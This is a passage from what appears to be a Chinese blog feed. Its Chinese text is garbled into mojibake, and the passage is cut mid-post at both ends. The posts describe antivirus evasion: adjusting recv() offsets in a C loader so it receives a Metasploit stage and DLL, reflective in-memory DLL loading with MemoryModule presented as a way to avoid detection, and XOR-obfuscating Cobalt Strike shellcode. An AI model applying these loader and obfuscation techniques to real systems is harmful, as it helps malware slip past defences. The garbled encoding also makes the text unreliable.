_In_ int flags);</code><br>è¯¥å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯å°†æ¥æ”¶åˆ°çš„å†…å®¹å­˜åˆ°ç¬¬äºŒä¸ªå‚æ•°æ‰€æŒ‡å‘çš„ç¼“å†²åŒº</p><p><img src="https://s2.loli.net/2022/10/19/HcQtfh9rgeM2WnE.png" alt="msf"><br>è¿æ¥msfæˆåŠŸï¼Œä¼ è¾“stage 2650bytes,ä¼ è¾“dll 8712bytesï¼Œä½†è¿™ä»ç„¶æ— æ³•è§£é‡Šä¸Šè¿°çš„recvä»£ç çš„åç§»é‡<br>äºæ˜¯æˆ‘æƒ³åˆ°æ‹¿wiresharkå»æŠ“åŒ…åˆ†æä¸€ä¸‹ï¼Œçœ‹çœ‹msfä¸€å…±ä¼ è¾“äº†å“ªäº›ä¸œè¥¿<br>è¿‡æ»¤æ‰æºIPä¸ç›®çš„IPä¹‹åï¼Œå¾—åˆ°å¦‚ä¸‹çš„TCPä¼ è¾“<br><img src="https://s2.loli.net/2022/10/19/V5DHfw4bZvESp3e.png" alt="wireshark"><br>é‚£æˆ‘ä»¬å°±æŒ¨ä¸ªæ¥çœ‹ä¸€ä¸‹è¿™äº›åŒ…æœ‰å¤šå¤§ï¼Œä»¥åŠå…·ä½“å†…å®¹</p><p>ä¸€å…±2658bytes<br><img src="https://s2.loli.net/2022/10/19/iqyYWgurDmvsUwo.png" alt="4bytes"><br><img src="https://s2.loli.net/2022/10/19/KhkV8u67fbEnmT2.png" alt="1460bytes"><br><img src="https://s2.loli.net/2022/10/19/L16PqxFlEQceCXb.png" alt="1194bytes"></p><p>ä¸€å…±8712bytes<br><img src="https://s2.loli.net/2022/10/19/M9GxW8vS7lnUaPI.png" alt="7300bytes"><br><img src="https://s2.loli.net/2022/10/19/UQd953TlzMeXkKA.png" alt="1412bytes"></p><p>äºæ˜¯å°†ä¸Šè¿°ä»£ç æ”¹ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">2650</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer, PAYLOAD_SIZE);<br><br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">8712</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>ä½†è²Œä¼¼è¿˜æ˜¯æ²¡æœ‰æˆåŠŸä¸Šçº¿</p><p>å½“æˆ‘ä¸€ä¸ªä¸€ä¸ªåŒ…ä»”ç»†çœ‹çš„æ—¶å€™ï¼Œçªç„¶æƒ³åˆ°ï¼Œåœ¨msfvenomç”Ÿæˆçš„æ—¶å€™ï¼Œä¼šå¸¦æœ‰dllå¤§å°çš„å…·ä½“ä¿¡æ¯ï¼Œäºæ˜¯é‡æ–°ç”Ÿæˆä¸€ä¸ªdllæ¥çœ‹<br><img src="https://s2.loli.net/2022/10/19/APHegd1Fp2vu3yB.png" alt="msfvenomç”Ÿæˆdll"><br>è¿™é‡Œå¯ä»¥çœ‹åˆ°dllå¤§å°ä¸º8704bytes<br>é‡æ–°æŠ“åŒ…åˆ†æ</p><p><img src="https://s2.loli.net/2022/10/19/AZXYbaGMgD7Pszh.png"><br>å¯ä»¥çœ‹åˆ°dllæ–‡ä»¶æ•°æ®ç”±7300+1416=8716bytesæ„æˆï¼Œæ„å‘³ç€æœ‰12byteséœ€è¦åç§»</p><p>äºæ˜¯å°†ä»£ç æ”¹ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">2650</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">12</span>, <span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer, PAYLOAD_SIZE);<br><br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">8704</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>ä½†ä»æ—§æ— æ³•ä¸Šçº¿ï¼Œå¯èƒ½ä¸æ˜¯è¿™ä¹ˆç®€å•çš„ç§»ä½ï¼Œè¿™é‡Œæˆ‘ç”¨é‚®ä»¶ç§ä¿¡äº†ä½œè€…ï¼Œå¾—åˆ°äº†è§£å†³åŠæ³•</p><blockquote><p>ç”¨vsè°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹lpbufferä¸­çš„å†…å­˜æƒ…å†µï¼Œæ‰¾åˆ°MZ DOSå¤´ï¼Œä»¥å†…å­˜çš„åç§»ä¸ºå‡†</p></blockquote><p>äºæ˜¯å†³å®šæ·±å…¥çš„äº†è§£ä¸€ä¸‹PEæ–‡ä»¶çš„ç»“æ„</p><p>ä»¥è¿™ä¸ªæ–‡ä»¶ä¸ºä¾‹</p><ol><li>ä»æ–‡ä»¶å¤´4D 5Aï¼ˆMZï¼‰å¼€å§‹ï¼Œè·³è½¬3Cï¼ˆå³åç§»3Cï¼‰</li><li>è·³è½¬åå¯è¯»å–åˆ°æ•°æ®ä¸º0000 00B0</li><li>å†è·³è½¬åˆ°åœ°å€0000 00B0ï¼›</li><li>è‹¥è¯¥åœ°å€æ•°æ®ä¸º50 45ï¼ˆå³PEï¼‰å°±ä¸ºPEæ–‡ä»¶ã€‚<br><img src="https://s2.loli.net/2022/10/20/qoaXzHOr7y95j4p.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MemoryModuleçš„å­¦ä¹ </title>
      <link href="2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="MemoryModule"><a href="#MemoryModule" class="headerlink" title="MemoryModule"></a>MemoryModule</h1><p>å¯¹äºdllåŠ«æŒå’Œè½¬å‘æ”»å‡»æ—¶ï¼Œä¸€èˆ¬ä¼šé€šè¿‡LoadLibraryè¿™ä¸ªAPIæ¥åŠ è½½DLLæ–‡ä»¶ï¼Œè™½ç„¶å…¶å­˜åœ¨ä¸€å®šçš„å…æ€æ•ˆæœï¼Œä½†æ•ˆæœä»ä¸æ˜¯ååˆ†æ˜¾è‘—ï¼Œäºæ˜¯ä¾¿å¼•å‡ºäº†MemoryModuleè¿™ä¸ªç”¨æ³•<br>è€Œç½‘ä¸Šå¯¹äºMemoryModuleçš„æ–‡ç« å¤§å¤šæ˜¯è‹±æ–‡ï¼Œè€Œä¸”æ™¦æ¶©éš¾æ‡‚ï¼Œè¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹å’Œä¸ªäººå¯¹äºMemoryModuleçš„ç†è§£ï¼Œå¯èƒ½å¾ˆå¤šåœ°æ–¹ç¿»è¯‘çš„ä¸å‡†ç¡®ï¼Œè§è°…</p><a id="more"></a><h2 id="MemoryModuleæ˜¯ä»€ä¹ˆ"><a href="#MemoryModuleæ˜¯ä»€ä¹ˆ" class="headerlink" title="MemoryModuleæ˜¯ä»€ä¹ˆ"></a>MemoryModuleæ˜¯ä»€ä¹ˆ</h2><p><a href="https://github.com/fancycode/MemoryModule/blob/master/doc/readme.rst">MemoryModuleé¡¹ç›®æ–‡ç« </a><br><a href="https://github.com/fancycode/MemoryModule">MemoryModuleåœ°å€</a></p><blockquote><p>æœ¬æ–‡çš„å¤§é‡ç¤ºä¾‹ä»£ç æ¥æºäºé¡¹ç›®æ–‡ç« ï¼Œåœ¨è¿™é‡Œç›´æ¥æ”¾ä¸Šé“¾æ¥ï¼Œå°±ä¸ä¸€å—ä¸€å—ä»£ç ç…§æ¬äº†</p></blockquote><p>é»˜è®¤çš„ Windows API å‡½æ•°å°†å¤–éƒ¨åº“åŠ è½½åˆ°ç¨‹åºä¸­ï¼ˆåŠ è½½åº“ã€åŠ è½½åº“Exï¼‰ä»…é€‚ç”¨äºæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚å› æ­¤ï¼Œä¸å¯èƒ½ä»å†…å­˜ä¸­åŠ è½½ DLLã€‚ä½†æœ‰æ—¶ï¼Œæ‚¨ç¡®å®éœ€è¦æ­¤åŠŸèƒ½ï¼ˆä¾‹å¦‚ï¼Œæ‚¨ä¸æƒ³åˆ†å‘å¤§é‡æ–‡ä»¶æˆ–å¸Œæœ›ä½¿åæ±‡ç¼–æ›´åŠ å›°éš¾ï¼‰ã€‚æ­¤é—®é¢˜çš„å¸¸è§è§£å†³æ–¹æ³•æ˜¯é¦–å…ˆå°† DLL å†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åä»é‚£é‡Œå¯¼å…¥ã€‚å½“ç¨‹åºç»ˆæ­¢æ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°†è¢«åˆ é™¤</p><h2 id="MemoryModuleä¸ºä»€ä¹ˆèƒ½å…æ€"><a href="#MemoryModuleä¸ºä»€ä¹ˆèƒ½å…æ€" class="headerlink" title="MemoryModuleä¸ºä»€ä¹ˆèƒ½å…æ€"></a>MemoryModuleä¸ºä»€ä¹ˆèƒ½å…æ€</h2><p>Windowsæ“ä½œç³»ç»Ÿåœ¨æ‰§è¡Œä¸€ä¸ªWindows PEæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼ŒWindowsè‡ªèº«æ˜¯æœ‰ä¸€ä¸ªWindows PEæ ¼å¼çš„è§£æå™¨ï¼Œé€šè¿‡PEæ ¼å¼æŠŠæ–‡ä»¶çš„å„ä¸ªèŠ‚æ”¾å…¥ä¸åŒçš„å†…å­˜åŒºåŸŸ</p><p>çˆ±æŠ˜è…¾çš„ç¨‹åºå‘˜è‡ªå·±ä¹Ÿæƒ³å®ç°è¿™ä¸ªè¿‡ç¨‹ï¼Œé‚£å°±æ˜¯åå°„ï¼Œè¿™ä¸ªåå°„æœºåˆ¶å°±æ˜¯å°†Windows PEæ ¼å¼é€šè¿‡è‡ªå·±å†™çš„ä»£ç è¿›è¡Œè§£æï¼Œå¹¶æŠŠä¸åŒçš„èŠ‚æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸è¿™ä¸ªåå°„åŠ è½½æŠ€æœ¯è¢«å¾ˆå¤šAPTç»„ç»‡ã€å¤§å‹æ¸—é€æ¡†æ¶ã€ç—…æ¯’ä½œè€…ä½¿ç”¨æ¯”è¾ƒå¹¿æ³›</p><p>å½“ä¸€ä¸ªWindows PEæ ¼å¼çš„æ–‡ä»¶å˜æˆäº†ä¸€ä¸ªå†…å­˜ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ„å‘³ç€è¿™ä¸ªæ–‡ä»¶å¯ä»¥è¢«ä»»æ„æ–¹å¼å»è½¬æ¢ã€åŠ å¯†ã€æ··æ·†ï¼Œå› æ­¤åç—…æ¯’è½¯ä»¶ä¹Ÿéš¾ä»¥æŸ¥æ€</p><h2 id="ç†è§£MemoryModule"><a href="#ç†è§£MemoryModule" class="headerlink" title="ç†è§£MemoryModule"></a>ç†è§£MemoryModule</h2><h3 id="windows-å¯æ‰§è¡Œæ–‡ä»¶PE"><a href="#windows-å¯æ‰§è¡Œæ–‡ä»¶PE" class="headerlink" title="windows å¯æ‰§è¡Œæ–‡ä»¶PE"></a>windows å¯æ‰§è¡Œæ–‡ä»¶PE</h3><h4 id="PE-header"><a href="#PE-header" class="headerlink" title="PE header"></a>PE header</h4><p>å¤§å¤šæ•°å¯ä»¥åŒ…å«å¯æ‰§è¡Œä»£ç ï¼ˆ.exe  .dll.sysï¼‰çš„ Windows äºŒè¿›åˆ¶æ–‡ä»¶å…±äº«ä¸€ç§é€šç”¨æ–‡ä»¶æ ¼å¼ï¼Œè€ŒPEæ–‡ä»¶æ ¼å¼ä¹Ÿæ˜¯å¦‚æ­¤<br>åœ¨windowsäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼ŒPEæ–‡ä»¶æœ‰ç‹¬ç‰¹çš„æ ‡è¯†ï¼Œç§°ä¹‹ä¸ºPE header<br>PEæ ‡å¤´åŒ…å«æœ‰å…³å¯æ‰§è¡Œæ–‡ä»¶ä¸­ç”¨äºå­˜å‚¨ä»£ç å’Œæ•°æ®æˆ–å®šä¹‰ä»å…¶ä»–åº“å¯¼å…¥æˆ–æ­¤åº“æä¾›çš„å¯¼å‡ºçš„ä¸åŒéƒ¨åˆ†çš„ä¿¡æ¯<br>åœ¨è¯¥ä¿¡æ¯ä¸­</p><ul><li>æè¿°äº†æ–‡ä»¶çš„ç‰©ç†æ ¼å¼ï¼Œå³å†…å®¹ï¼Œæœ‰å…³ç¬¦å·çš„ä¿¡æ¯ç­‰</li><li>åŒ…å«æœ‰å…³åº“çš„é€»è¾‘æ ¼å¼çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€éœ€çš„æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€å†…å­˜è¦æ±‚å’Œå…¥å£ç‚¹</li><li>åŒ…å« 16 ï¼ˆï¼‰ ä¸ªæ¡ç›®ï¼Œç”¨äºå®šä¹‰åº“çš„é€»è¾‘ç»„ä»¶<br>å¯¹äºå¯¼å…¥ DLLï¼Œæˆ‘ä»¬åªéœ€è¦æè¿°å¯¼å…¥å’ŒåŸºé‡å®šä½è¡¨çš„æ¡ç›®ã€‚ä¸ºäº†æä¾›å¯¹å¯¼å‡ºå‡½æ•°çš„è®¿é—®ï¼Œéœ€è¦å¯¼å‡ºæ¡ç›®ã€‚</li></ul><p><strong>ä¸ªäººç†è§£ï¼šPE headeræ›´ç±»ä¼¼äºä¸€ç§ç½‘ç»œåè®®ä¸­çš„æ ‡è¯†ç¬¦ï¼Œæ¥å‘Šè¯‰windowsæ–‡ä»¶çš„æ ¼å¼ä¿¡æ¯</strong></p><h4 id="Section-header"><a href="#Section-header" class="headerlink" title="Section header"></a>Section header</h4><p>Section headerå­˜å‚¨åœ¨ PE headerä¸­çš„OptionalHeader_ç»“æ„ä¹‹åã€‚å¾®è½¯æä¾›äº†å®æ¥è·å–åŸºäº PE æ ‡å¤´çš„èµ·å§‹åœ°å€ã€‚<br><strong>ä¸ªäººç†è§£ï¼šSection headerçš„å¤§è‡´ç”¨å¤„æ˜¯å­˜å‚¨äº†æœ‰å…³æ–‡ä»¶ä¸­çš„æ¯ä¸ªSecitonçš„ä¿¡æ¯</strong></p><h3 id="Loading-the-library"><a href="#Loading-the-library" class="headerlink" title="Loading the library"></a>Loading the library</h3><p>åœ¨å‘å‡º API è°ƒç”¨æ—¶ï¼Œçª—å£åŸºæœ¬ä¸Šæ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼š<code>LoadLibrary</code></p><ul><li><p>æ‰“å¼€ç»™å®šæ–‡ä»¶å¹¶æ£€æŸ¥ DOS å’Œ PE æ ‡å¤´ã€‚</p></li><li><p>å°è¯•åœ¨ä½ç½®<code>PEHeader.OptionalHeader.ImageBase</code>åˆ†é…<code>PEHeader.OptionalHeader.SizeOfImage</code>å­—èŠ‚çš„å†…å­˜å—ã€‚</p></li><li><p>è§£æèŠ‚æ ‡é¢˜å¹¶å°†èŠ‚å¤åˆ¶åˆ°å…¶åœ°å€ã€‚ç›¸å¯¹äºåˆ†é…çš„å†…å­˜å—çš„åŸºæ•°ï¼Œæ¯ä¸ªéƒ¨åˆ†çš„ç›®æ ‡åœ°å€éƒ½å­˜å‚¨åœ¨<code>IMAGE_SECTION_HEADER</code>ç»“æ„çš„<code>VirtualAddress</code>å±æ€§ä¸­ã€‚</p></li><li><p>å¦‚æœåˆ†é…çš„å†…å­˜å—ä¸<code>ImageBase</code>ä¸åŒï¼Œåˆ™å¿…é¡»è°ƒæ•´ä»£ç å’Œ/æˆ–æ•°æ®éƒ¨åˆ†ä¸­çš„å„ç§å¼•ç”¨ã€‚è¿™ç§°ä¸ºåŸºæœ¬é‡å®šä½ã€‚</p></li><li><p>å¿…é¡»é€šè¿‡åŠ è½½ç›¸åº”çš„åº“æ¥è§£å†³åº“æ‰€éœ€çš„å¯¼å…¥ã€‚</p></li><li><p>å¿…é¡»æ ¹æ®èŠ‚çš„ç‰¹å¾ä¿æŠ¤ä¸åŒèŠ‚çš„å†…å­˜åŒºåŸŸã€‚æŸäº›éƒ¨åˆ†è¢«æ ‡è®°ä¸ºå¯ä¸¢å¼ƒï¼Œå› æ­¤æ­¤æ—¶å¯ä»¥å®‰å…¨åœ°é‡Šæ”¾ã€‚è¿™äº›éƒ¨åˆ†é€šå¸¸åŒ…å«ä»…åœ¨å¯¼å…¥æœŸé—´éœ€è¦çš„ä¸´æ—¶æ•°æ®</p></li><li><p>ç°åœ¨åº“å·²å®Œå…¨åŠ è½½ã€‚ é¡»é€šè¿‡ä½¿ç”¨æ ‡å¿—<code>DLL_PROCESS_ATTACH</code>è°ƒç”¨å…¥å£ç‚¹ æ¥é€šçŸ¥å®ƒã€‚</p></li></ul><h4 id="åˆ†é…å†…å­˜"><a href="#åˆ†é…å†…å­˜" class="headerlink" title="åˆ†é…å†…å­˜"></a>åˆ†é…å†…å­˜</h4><p>åº“æ‰€éœ€çš„æ‰€æœ‰å†…å­˜å¿…é¡»ä½¿ç”¨ ä¿ç•™/åˆ†é…ï¼Œå› ä¸º Windows æä¾›äº†ä¿æŠ¤è¿™äº›å†…å­˜å—çš„åŠŸèƒ½ã€‚è¿™æ˜¯é™åˆ¶å¯¹å†…å­˜çš„è®¿é—®æ‰€å¿…éœ€çš„ï¼Œä¾‹å¦‚é˜»æ­¢å¯¹ä»£ç æˆ–å¸¸é‡æ•°æ®çš„å†™å…¥è®¿é—®ã€‚<br><strong>ä¸ªäººç†è§£ï¼šè¿™é‡Œä¸»è¦æ˜¯åˆ©ç”¨<code>VirtualAlloc</code>å‡½æ•°æ¥åˆ†é…å†…å­˜ï¼Œå¯¹äºè¯¥å‡½æ•°æ˜¯windowsçš„ä¸€ä¸ªAPIå‡½æ•°ï¼Œç”¨æ¥ç”³è¯·å†…å­˜ç©ºé—´</strong></p><h4 id="å¤åˆ¶å†…å­˜"><a href="#å¤åˆ¶å†…å­˜" class="headerlink" title="å¤åˆ¶å†…å­˜"></a>å¤åˆ¶å†…å­˜</h4><p>ç»è¿‡å‰é¢çš„åˆ†é…å†…å­˜ä¹‹åï¼Œå¯ä»¥å°†æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°ç³»ç»Ÿä¸­ã€‚å¿…é¡»è®¡ç®—èŠ‚å¤´ï¼Œä»¥ç¡®å®šæ–‡ä»¶ä¸­çš„ä½ç½®å’Œå†…å­˜ä¸­çš„ç›®æ ‡åŒºåŸŸ<br><strong>ä¸ªäººç†è§£ï¼šé€šè¿‡å¤åˆ¶å†…å®¹ï¼Œå°†shellcodeç§»åŠ¨åˆ°ç”³è¯·çš„å†…å­˜ç©ºé—´ä¸­æ¥å®ç°å…æ€</strong></p><h4 id="è¿ç§»å†…å­˜"><a href="#è¿ç§»å†…å­˜" class="headerlink" title="è¿ç§»å†…å­˜"></a>è¿ç§»å†…å­˜</h4><p>åº“çš„ä»£ç /æ•°æ®éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å­˜åœ°å€éƒ½ç›¸å¯¹äºOptionalHeader_ä¸­å®šä¹‰çš„åœ°å€è¿›è¡Œå­˜å‚¨<br>å¦‚æœæ— æ³•å°†åº“å¯¼å…¥åˆ°æ­¤å†…å­˜åœ°å€ï¼Œåˆ™å¿…é¡»è°ƒæ•´å¼•ç”¨ =&gt;é‡æ–°å®šä½ã€‚æ–‡ä»¶æ ¼å¼é€šè¿‡åœ¨åŸºé‡å®šä½è¡¨ä¸­å­˜å‚¨æœ‰å…³æ‰€æœ‰è¿™äº›å¼•ç”¨çš„ä¿¡æ¯æ¥å¸®åŠ©å®ç°è¿™ä¸€ç‚¹<br><strong>ä¸ªäººç†è§£ï¼šè¿™é‡Œéœ€è¦é‡æ–°è®¡ç®—å†…å­˜åœ°å€ï¼Œå¦åˆ™è§£æPEæ–‡ä»¶æ—¶ï¼Œå¯¼å…¥åº“å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æŒ‡é’ˆæŒ‡å‘é”™è¯¯</strong></p><h4 id="è§£æå¯¼å…¥"><a href="#è§£æå¯¼å…¥" class="headerlink" title="è§£æå¯¼å…¥"></a>è§£æå¯¼å…¥</h4><p>å½“æˆ‘ä»¬è§£æå¯¼å…¥æ—¶ï¼Œæˆ‘ä»¬å¹¶è¡Œéå†ä¸¤ä¸ªåˆ—è¡¨ï¼Œå¯¼å…¥ç”±ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­çš„åç§°å®šä¹‰çš„å‡½æ•°ï¼Œå¹¶å°†æŒ‡å‘ç¬¬äºŒä¸ªåˆ—è¡¨ä¸­çš„ç¬¦å·çš„æŒ‡é’ˆå­˜å‚¨<br><strong>ä¸ªäººç†è§£ï¼šæˆ‘å¯¹è¿™é‡Œçš„ç†è§£å¹¶æ²¡æœ‰ååˆ†æ¸…æ™°ï¼Œä½†å…¶ç›®çš„å¯èƒ½æ˜¯ä¸ºäº†ä½¿å¤–éƒ¨åº“å¯¼å…¥çš„å‡½æ•°åèƒ½æ‰¾åˆ°å…¶å¯¹åº”çš„å†…å­˜åœ°å€</strong></p><h4 id="ä¿æŠ¤å†…å­˜ä¸é€šçŸ¥åº“"><a href="#ä¿æŠ¤å†…å­˜ä¸é€šçŸ¥åº“" class="headerlink" title="ä¿æŠ¤å†…å­˜ä¸é€šçŸ¥åº“"></a>ä¿æŠ¤å†…å­˜ä¸é€šçŸ¥åº“</h4><p><code>VirtualProtect</code>è¯¥å‡½æ•°å¯ç”¨äºé™åˆ¶å¯¹å†…å­˜çš„è®¿é—®ã€‚å¦‚æœç¨‹åºå°è¯•ä»¥æœªç»æˆæƒçš„æ–¹å¼è®¿é—®å®ƒï¼Œåˆ™ Windows ä¼šå¼•å‘å¼‚å¸¸ã€‚<br>æœ€åè¦åšçš„æ˜¯è°ƒç”¨ DLL å…¥å£ç‚¹ï¼ˆç”± å®šä¹‰ï¼‰ï¼Œä»è€Œé€šçŸ¥åº“è¿æ¥åˆ°è¿›ç¨‹ã€‚<code>AddressOfEntryPoint</code><br><strong>ä¸ªäººç†è§£ï¼šå†…å­˜ä¿æŠ¤ç±»ä¼¼äºconstï¼Œé˜²æ­¢å…¶ä»–ç¨‹åºçš„ä½¿ç”¨å¯¼è‡´è¯¥å†…å­˜å‡ºç°é—®é¢˜</strong></p><h3 id="Exported-functions"><a href="#Exported-functions" class="headerlink" title="Exported functions"></a>Exported functions</h3><p>å¦‚æœè¦è®¿é—®åº“å¯¼å‡ºçš„å‡½æ•°ï¼Œåˆ™éœ€è¦æ‰¾åˆ°ç¬¦å·çš„å…¥å£ç‚¹ï¼Œå³è¦è°ƒç”¨çš„å‡½æ•°çš„åç§°ã€‚<br>é¦–å…ˆè¦åšçš„æ˜¯å°†å‡½æ•°çš„åç§°æ˜ å°„åˆ°å¯¼å‡ºç¬¦å·çš„åºå·ã€‚å› æ­¤ï¼Œåªéœ€éå†ç”± å®šä¹‰çš„æ•°ç»„å¹¶å¹¶è¡Œï¼Œç›´åˆ°æ‰¾åˆ°æ‰€éœ€çš„åç§°<br><strong>ä¸ªäººç†è§£ï¼šè¿™é‡Œä¸å‰é¢çš„è§£æå¯¼å…¥ç›¸å¯¹åº”ï¼Œä¸ºäº†ä½¿å‡½æ•°åèƒ½æ‰¾åˆ°å…¶å¯¹åº”çš„å†…å­˜åœ°å€</strong></p><h3 id="Freeing-the-library-amp-MemoryModule"><a href="#Freeing-the-library-amp-MemoryModule" class="headerlink" title="Freeing the library &amp; MemoryModule"></a>Freeing the library &amp; MemoryModule</h3><p>è¿™é‡Œæ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œåªæ˜¯é‡Šæ”¾è‡ªå®šä¹‰çš„åº“ä¸Cä¸­çš„ä¸€ä¸ªåº“ï¼Œå¯ä»¥ä»å†…å­˜ä¸­åŠ è½½DLL</p>]]></content>
      
      
      <categories>
          
          <category> å‰ç½®çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€æ¶æ„ä»£ç é€ƒé€¸1</title>
      <link href="2022/10/17/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/"/>
      <url>2022/10/17/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="é™æ€æ¶æ„ä»£ç é€ƒé€¸1"><a href="#é™æ€æ¶æ„ä»£ç é€ƒé€¸1" class="headerlink" title="é™æ€æ¶æ„ä»£ç é€ƒé€¸1"></a>é™æ€æ¶æ„ä»£ç é€ƒé€¸1</h1><p>æœ€è¿‘åœ¨å­¦ä¹ ä»åº•å±‚ç”¨C/C++å»å®ç°å…æ€ï¼Œè€Œçœ‹åˆ°äº†å…³äºé™æ€æ¶æ„ä»£ç é€ƒé€¸çš„ä¸€äº›å¾ˆå¥½çš„æ–‡ç« ï¼Œåœ¨æ­¤è®°å½•æ€»ç»“ä¸€ä¸‹</p><a id="more"></a><h2 id="æ¶æ„ä»£ç ä¸shellcode"><a href="#æ¶æ„ä»£ç ä¸shellcode" class="headerlink" title="æ¶æ„ä»£ç ä¸shellcode"></a>æ¶æ„ä»£ç ä¸shellcode</h2><p>Shellcodeæ˜¯ä¸€æ®µæœºå™¨æŒ‡ä»¤çš„é›†åˆï¼Œé€šå¸¸ä¼šè¢«å‹ç¼©è‡³å¾ˆå°çš„é•¿åº¦ï¼Œè¾¾åˆ°ä¸ºåç»­æ¶æ„ä»£ç é“ºå«çš„ä½œç”¨ã€‚å½“ç„¶ä½ å¯ä»¥é€šè¿‡msfvenomç”Ÿæˆå„ç§ç”¨äºæµ‹è¯•çš„shellcode</p><h2 id="CSç”Ÿæˆçš„rawæ–‡ä»¶ä¸Cæ–‡ä»¶"><a href="#CSç”Ÿæˆçš„rawæ–‡ä»¶ä¸Cæ–‡ä»¶" class="headerlink" title="CSç”Ÿæˆçš„rawæ–‡ä»¶ä¸Cæ–‡ä»¶"></a>CSç”Ÿæˆçš„rawæ–‡ä»¶ä¸Cæ–‡ä»¶</h2><p>åœ¨CSä¸­ï¼Œç”Ÿæˆçš„Shellcodeå¯ä»¥ä¸ºrawæ–‡ä»¶å’ŒCæ–‡ä»¶<br><img src="https://s2.loli.net/2022/10/17/7hBy9ialGgvKAfj.png" alt="raw"><br><img src="https://s2.loli.net/2022/10/17/aLuKOBbCd7TNWwv.png" alt="C"><br>åœ¨è‹±æ–‡ä¸­ï¼Œrawå¯ä»¥è¢«è¯‘ä¸º ç”Ÿçš„ï¼ŒæœªåŠ å·¥çš„ï¼Œè€ŒCSç”Ÿæˆå‡ºæ¥çš„å°±æ˜¯binæ–‡ä»¶ï¼Œæ•…rawæ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œå­—èŠ‚æ“ä½œè¯»å–çš„ï¼Œå› æ­¤åŠ è½½åˆ°å†…å­˜è¾ƒä¸ºæ–¹ä¾¿<br>è€ŒCæ–‡ä»¶ç»™å‡ºçš„æ˜¯ä¸€ä¸ªCè¯­è¨€ä¸­çš„å­—ç¬¦æ•°ç»„ï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ä»¥å­—èŠ‚å•ä½æ“ä½œçš„</p><h3 id="å¯¹äºè½½è·çš„æ··æ·†"><a href="#å¯¹äºè½½è·çš„æ··æ·†" class="headerlink" title="å¯¹äºè½½è·çš„æ··æ·†"></a>å¯¹äºè½½è·çš„æ··æ·†</h3><p>æ ¸å¿ƒæ€æƒ³æ˜¯å°†shellcodeè¿›è¡Œæ··æ·†ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯XOR</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">new_shellcode = <span class="hljs-built_in">ord</span>(old_shellcode) ^ key<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè´´ä¸€ä¸‹å¤§ä½¬çš„ä»£ç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 